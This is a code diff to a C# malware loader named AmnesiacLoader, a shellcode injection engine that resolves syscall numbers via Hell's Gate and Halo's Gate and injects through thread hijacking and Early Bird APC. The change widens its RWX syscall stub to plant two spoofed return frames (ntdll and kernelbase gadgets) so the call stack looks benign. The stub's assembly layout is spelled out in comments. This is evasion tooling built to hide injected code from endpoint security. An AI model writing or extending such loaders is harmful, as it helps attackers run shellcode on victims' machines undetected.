@@ -1,6 +1,6 @@
 // AmnesiacLoader — Indirect Syscall Injection Engine
 // SSN resolution: EAT walking (Hell's Gate) + neighbor scan fallback (Halo's Gate)
-// Syscall stubs:  RWX-allocated 33-byte native stubs with one spoofed return frame
+// Syscall stubs:  RWX-allocated 48-byte native stubs with two spoofed return frames (ntdll + kernelbase)
 // Injection:      Thread hijacking (InjectShellcode), Early Bird APC (InjectNewProcess)
 
 using System;
@@ -112,15 +112,18 @@ namespace AmnesiacLoader
         const uint PAGE_EXECUTE_READWRITE = 0x40;
 
         // ── Stub allocator ────────────────────────────────────────────────────────
-        // Allocates a 33-byte RWX stub:
-        //   sub rsp, 8           (4B) — room for fake frame
-        //   mov rax, <gadget64>  (10B) — ntdll RET gadget
-        //   mov [rsp], rax       (4B) — install fake return address
-        //   mov r10, rcx         (3B) — syscall ABI requirement
-        //   mov eax, <ssn>       (5B) — syscall number
-        //   syscall              (2B)
-        //   add rsp, 8           (4B) — clean up fake frame slot
-        //   ret                  (1B)
+        // Allocates a 48-byte RWX syscall stub with two spoofed return frames:
+        //   sub rsp, 16                ; make room for 2 fake frames
+        //   mov rax, <kbaseGadget>     ; outermost frame (kernelbase.dll)
+        //   mov [rsp+8], rax
+        //   mov rax, <ntdllGadget>     ; innermost frame (ntdll.dll), adjacent to syscall
+        //   mov [rsp], rax
+        //   mov r10, rcx
+        //   mov eax, <ssn>
+        //   syscall
+        //   add rsp, 16
+        //   ret
+        // Call stack at syscall: [kernelbase_gadget] -> [ntdll_gadget] -> syscall
 
         internal static IntPtr AllocateStub(ushort ssn, IntPtr ntdllGadget, IntPtr kbaseGadget)
         {
